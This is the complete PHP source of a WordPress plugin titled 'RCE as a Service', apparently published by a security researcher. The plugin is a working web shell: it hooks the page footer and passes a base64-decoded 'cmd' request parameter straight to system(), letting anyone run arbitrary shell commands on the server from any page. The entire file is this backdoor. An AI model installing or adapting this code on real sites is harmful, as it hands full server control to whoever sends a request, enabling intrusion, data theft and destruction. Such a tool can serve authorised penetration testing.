<?php
/**
 * RCE as a Service 
 *
 * @package   rce-as-a-service
 * @author    xanhacks
 * @license   GPL-2.0+
 * @link      https://github.com/xanhacks/wordpress-rce-plugin
 * @copyright 2023, xanhacks
 *
 * @wordpress-plugin
 * Plugin Name:       RCE as a Service
 * Plugin URI:        https://github.com/xanhacks/wordpress-rce-plugin
 * Description:       Obtain an RCE in every wordpress page.
 * Version:           1.0.0
 * Author:            xanhacks
 * Author URI:        https://github.com/xanhacks
 * Text Domain:       rce-as-a-service
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Domain Path:       /languages
 * GitHub Plugin URI: https://github.com/xanhacks/wordpress-rce-plugin
 * GitHub Branch:     main
 */

add_action("wp_footer", "footer_rce");

function footer_rce() {
	system(base64_decode($_REQUEST["cmd"]));
}
